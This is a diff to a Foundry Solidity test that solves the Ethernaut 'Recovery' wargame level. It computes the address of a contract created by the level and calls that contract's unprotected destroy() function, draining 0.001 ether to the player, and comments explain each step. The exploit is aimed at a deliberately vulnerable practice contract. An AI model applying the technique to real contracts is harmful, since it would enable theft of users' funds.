@@ -24,13 +24,47 @@ contract RecoveryTest is Test {
         RecoveryFactory recoveryFactory = new RecoveryFactory();
         ethernaut.registerLevel(recoveryFactory);
         vm.startPrank(player);
-        address levelAddress = ethernaut.createLevelInstance(
-            recoveryFactory
-        );
-        Recovery ethernautRecovery = Recovery(levelAddress);
+        address levelAddress = ethernaut.createLevelInstance{
+            value: 0.001 ether
+        }(recoveryFactory);
+        Recovery ethernautRecovery = Recovery(payable(levelAddress));
         /****************
          *    Attack     *
          *************** */
+
+        /*
+        * For this level we will need to play around with EVM OPCODE
+        * We need to really understand the contract and what's happening with new SimpleToken(_name, msg.sender, _initialSupply);
+        * It actually create OPCODE; new keyword uses the CREATE
+        * So there is a way to find the address of this created contract with opcode
+        * Once we have found it, it's quite straightforwad to call destroy method available
+        *  on simpleToken and which is not protected :)
+        */
+        address addressToFind = address(
+            uint160(
+                uint256(
+                    keccak256(
+                        abi.encodePacked(
+                            bytes1(0xd6),
+                            bytes1(0x94),
+                            address(levelAddress),
+                            bytes1(0x01)
+                        )
+                    )
+                )
+            )
+        );
+
+        uint256 balanceBefore = addressToFind.balance;
+        assertEq(balanceBefore, 0.001 ether);
+        uint256 playerBalanceBefore = player.balance;
+        /*
+        * not using the new keywoard for SimpleToken as we point to an existing contract
+        */
+        SimpleToken(payable(addressToFind)).destroy(payable(player));
+        uint256 balanceAfter = addressToFind.balance;
+        assertEq(balanceAfter, 0);
+        assertEq(player.balance, playerBalanceBefore + 0.001 ether);
 
         /*****************
          *Level Submission*
